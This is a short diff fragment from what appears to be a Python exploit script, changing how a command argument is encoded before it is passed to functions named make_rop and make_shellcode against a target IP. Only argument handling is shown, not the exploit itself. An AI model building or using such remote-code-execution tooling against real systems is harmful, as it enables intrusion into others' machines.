@@ -118,7 +118,7 @@ if __name__ == "__main__":
 
     if len(sys.argv) == 3:
         ip = sys.argv[1]
-        cmd = bytearray(sys.argv[2], "ascii")
+        cmd = bytes(sys.argv[2], "ascii")
 
         rop = make_rop()
         shellcode = make_shellcode(cmd)
